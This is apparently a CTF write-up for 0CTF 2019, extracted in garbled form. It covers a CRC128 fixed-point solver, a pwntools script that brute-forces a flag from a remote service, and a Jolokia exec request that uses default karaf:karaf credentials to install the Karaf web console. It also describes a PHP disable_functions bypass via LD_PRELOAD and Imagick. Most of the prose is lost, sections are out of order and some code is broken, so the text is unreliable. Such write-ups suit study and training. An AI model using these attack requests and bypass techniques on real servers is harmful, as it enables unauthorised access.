p.sendline(payload7)
p.interactive()
Fixed Point
http://111.186.63.17/ﬁxed_point
38 ﬂag{}
hex sscanf 0x555555554000 4096Init_array
 crc = (crc >> 8) ^ k[crc & 0xff ^ flag[i]]
16bit ↑ tmcrc128
https://github.com/glua-team-ctf/googlectf-quals-2017/blob/master/crypto/introspective-crc/REA
DME.md
crcdiﬀ/
unsigned long long a = 0xFFFFFFFFFFFFFFFFuLL;
unsigned long long b = 0xFFFFFFFFFFFFFFFFuLL;
int i = 0;
do {
    char f = flag[i++];
    unsigned long long * p = (arr + 16 * (unsigned char)(a ^ f));
    unsigned long long x = (a >> 8) ^ *p;
    a = x;
    unsigned long long y = (b >> 8) ^ *(p+1);
    b = y;
} while (i != 22)
data = [0]*0x100
v = 1
v1 = 128
for v0 in range(8,0,-1):
    v4 = v & 1
    v >>= 1
    if v4:
        v ^= 0xB595CF9C8D708E2166D545CF7CFDD4F9
    for i in range(0,256,2*v1):
        data[i+v1] = data[i] ^ v
    v1 >>= 1
import z3
import numpy as np
crctable = [0]*0x100
def genCrc128Table():
    v = 1
    v1 = 128
    for v0 in range(8,0,-1):
        v4 = v & 1
        v >>= 1
        if v4:
            v ^= 0xB595CF9C8D708E2166D545CF7CFDD4F9
        for i in range(0,256,2*v1):
            crctable[i+v1] = crctable[i] ^ v
        v1 >>= 1
def doCrc128(s):
    crc = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    for c in s:
        crc = ((crc >> 8) ^ crctable[(crc ^ c) & 0xff]) & 
0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    return crc
def padleft(x):
    return "0" * (128 - len(x)) + x
def main():
    # x = crc128('flag{' + x)
    flag_template = [ord(c) for c in "flag{" + '\x00' * 16 + '}']
    k = doCrc128(flag_template)
    def crcdiff(x):
        return (doCrc128(x) ^ k)
    D = [0] * 128
    for j,i in enumerate(range(127, -1, -1)): # msb
        _cur_template = list(flag_template)
        _cur_template[5 + i // 8] |= 1 > (i % 8)
            k ^= (doCrc128(_cur_template) ^ _k)
        j += 1
    return k == doCrc128([ord(c) for c in "flag{"] + out + [ord('}')])
def crc(s):
    return doCrc128([ord(c) for c in s])
def check_flag(s): # lsb first
    return crc("flag{" + s + '}') == int(s.decode('hex')[::-1].encode('hex'), 
16)
if __name__ == '__main__':
    genCrc128Table()
    #print check((1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 
0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 
1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 
1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 
1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 
0, 0, 0, 1))
    #print check_flag("3cb2b8ad126784aeb76bffad5eda4dbf")
    #print crc("flag{" + '\x00' * 15 + '\x01' + '}') == crc("flag{" + '\x00' * 
16 + '}') ^ (crc("flag{" + '\x00' * 15 + '\x01' + '}') ^ crc("flag{" + '\x00' 
* 16 + '}'))
    main()
Dk sage
LSB
sanitize
Help me to ﬁnd lost ﬂag.
http://111.186.63.17/sanitize.tar.gz
nc 111.186.63.16 20193 __sancov_guards 
addOne+1
 ﬂag
https://clang.llvm.org/docs/SanitizerCoverage.html
Flag Flag
Flag  Flag ↑49 
F = GF(2)
D = Matrix(F, {D})
A = D + identity_matrix(F, 128)
b = vector(F, {k})
A.transpose().solve_right(b)
def set2hex(s):
    binstr = ''.join([str(c) for c in s])
    return ''.join([chr(int(''.join(c),2)) for c in grouper(binstr, 
8)]).encode('hex')
set2hex() # MSB
set2hex().decode('hex')[::-1].encode('hex') # LSB
char c;
int depth;
node * miaomiaomiao;
node * left;
node * right;
 ABCEDFGH  
ﬂag
 0ctftrace 
17{ } 14
                            /    
                       /        \
              /        \         /         \
     /       \         /  \     /  \
  6    2   22  18
 /     \     /   \   / \  / \ 
 15    13   11   9  7  5 3  1
                    0
                  /  
                 4            8
               /  \          / \
              6    2       10  (0)      12
            / \   / \     /  \         /  \
           7  5  3   1   11  9       13   (8)  
char c;
int height;
node * higher_level;
node * lower_level;
node * brother;
from pwn import * 
#p = process('./sanitize')
Web
Ghost Pepper
Ghost Pepper Do you know ghost pepper? Let's eat. http://111.186.63.207:31337
/karaf/karaf 404 jetty
http://111.186.63.207:31337/jolokia
http://111.186.63.207:31337/jolokia/list
#flag = 'flag{fr0M_C0vEr4ge_To_Fl4G_And_Enj0Y_0cTF_2Ol9}'
flag = 'flag{'
for ll in xrange(len(flag), 49):
  r = 0
  for c in xrange(32, 128):
    p = remote('111.186.63.16', 20193)
    ff = chr(c) * 14
    p.sendline(ff)
    p.sendline('3')
    #for i in xrange(3):
    # p.sendline(str(i))
    p.sendline(str(ll))
    p.sendline('4')
    p.sendline('48')
    data = p.recvline()
    d = []
    for i in xrange(82):
      d.append(u32(data[i*8:i*8+8].decode('hex')))
      #print i, hex(d[i])
    print chr(c), d[38], d[39]
    if (r == 0):
      r = d[38]
    if (r != d[38]):
      flag += chr(c)
      print flag
      break
    c+=1
    p.close()
 karaf, jolokia installFeature, webconsole
WebConsoleﬂag
POST http://111.186.63.207:31337/jolokia/exec HTTP/1.1
Authorization: Basic a2FyYWY6a2FyYWY=
content-type: application/json
{
    "type": "EXEC",
    "mbean": "org.apache.karaf:name=root,type=feature",
    "operation": "installFeature(java.lang.String)",
    "arguments": ["webconsole"]
}
HTTP/1.1 200 OK
Date: Mon, 25 Mar 2019 09:34:51 GMT
Content-Type: text/plain;charset=utf-8
Cache-Control: no-cache
Pragma: no-cache
Expires: Mon, 25 Mar 2019 08:34:51 GMT
Connection: close
Server: Jetty(9.3.24.v20180605)
{
  "request": {
    "mbean": "org.apache.karaf:name=root,type=feature",
    "arguments": [
      "webconsole"
    ],
    "type": "exec",
    "operation": "installFeature(java.lang.String)"
  },
  "value": null,
  "timestamp": 1553506491,
  "status": 200
}
Wallbreaker Easy
http://111.186.63.208:31340 dis_fun:
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopp
ed,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl
_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_ge
t_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimed
wait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system
,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mai
l
PHP bypass disable_function
imagick
imagick module  enabled
imagick module version  3.4.3RC2 
imagick classes   Imagick, ImagickDraw, ImagickPixel, ImagickPixelIterator, 
ImagickKernel 
Imagick compiled with ImageMagick version   ImageMagick 6.9.7-4 Q16 x86_64 
20170114 http://www.imagemagick.org 
Imagick using ImageMagick library version   ImageMagick 6.9.7-4 Q16 x86_64 
20170114 http://www.imagemagick.org 
ImageMagick copyright   © 1999-2017 ImageMagick Studio LLC 
ImageMagick release date  20170114 
ImageMagick number of supported formats:    220 
ImageMagick supported formats   3FR, AAI, AI, ART, ARW, AVI, AVS, BGR, BGRA, 
BGRO, BIE, BMP, BMP2, BMP3, BRF, CAL, CALS, CANVAS, CAPTION, CIN, CIP, CLIP, 
CMYK, CMYKA, CR2, CRW, CUR, CUT, DATA, DCM, DCR, DCX, DDS, DFONT, DNG, DPX, 
DXT1, DXT5, EPDF, EPI, EPS, EPS2, EPS3, EPSF, EPSI, EPT, EPT2, EPT3, ERF, FAX, 
FILE, FITS, FRACTAL, FTP, FTS, G3, G4, GIF, GIF87, GRADIENT, GRAY, GROUP4, H, 
HALD, HDR, HISTOGRAM, HRZ, HTM, HTML, HTTP, HTTPS, ICB, ICO, ICON, IIQ, INFO, 
INLINE, IPL, ISOBRL, ISOBRL6, JBG, JBIG, JNG, JNX, JPE, JPEG, JPG, JPS, JSON, 
K25, KDC, LABEL, M2V, M4V, MAC, MAGICK, MAP, MASK, MAT, MATTE, MEF, MIFF, MKV, 
MNG, MONO, MOV, MP4, MPC, MPEG, MPG, MRW, MSL, MTV, MVG, NEF, NRW, NULL, ORF, 
OTB, OTF, PAL, PALM, PAM, PATTERN, PBM, PCD, PCDS, PCL, PCT, PCX, PDB, PDF, 
PDFA, PEF, PES, PFA, PFB, PFM, PGM, PICON, PICT, PIX, PJPEG, PLASMA, PNG, 
PNG00, PNG24, PNG32, PNG48, PNG64, PNG8, PNM, PPM, PREVIEW, PS, PS2, PS3, PSB, 
PSD, PTIF, PWP, RADIAL-GRADIENT, RAF, RAS, RAW, RGB, RGBA, RGBO, RGF, RLA, 
RLE, RMF, RW2, SCR, SCT, SFW, SGI, SHTML, SIX, SIXEL, SPARSE-COLOR, SR2, SRF, 
STEGANO, SUN, TEXT, TGA, THUMBNAIL, TIFF, TIFF64, TILE, TIM, TTC, TTF, TXT, 
UBRL, UBRL6, UIL, UYVY, VDA, VICAR, VID, VIFF, VIPS, VST, WBMP, WMV, WPG, X, 
X3F, XBM, XC, XCF, XPM, XPS, XV, XWD, YCbCr, YCbCrA, YUV 
imagickdisable_function
ghostscript1dayimagick0day
putenv()Linux
bypass_disablefunc_via_LD_PRELOAD
mail()imagick
scanfUBUNTU1604
setImageColorspace(255);  
$im->setCompression(Imagick::COMPRESSION_JPEG);  
$im->setCompressionQuality(100);  
$im->setImageFormat('pdf');  
$im->writeImage('thumb.jpg');  
?>  
(path)
UBUNTU1804()
UBUNTU1804IM /etc/ImageMagick-
6/policy.xml 
PSEPIPDFXPSgs
delegates
https://github.com/ImageMagick/ImageMagick/blob/06e45a6745f6bed140e46d0dadedf796e5dcd
9e6/www/source/delegates.xml
delegatescommand
Imagick
so LD_PRELOAD ﬂag
Crypto
babyrsa
Polynomial based RSA. n
R. = GF(2^2049)
P=PolynomialRing(GF(2),'x')
n = P('xxx')
MISC
ﬂropyd
 ROPseccompexitROP
 .jpg
 update1: you can download libc here update2: md5(libc.so.6) ==
50390b2ae8aaa73c47745040f54e602f
p, q = factor(n)
p, q = p[0], q[0]
phi_n = (2^p.degree() - 1)*(2^q.degree()-1)
d = inverse_mod(e, phi_n)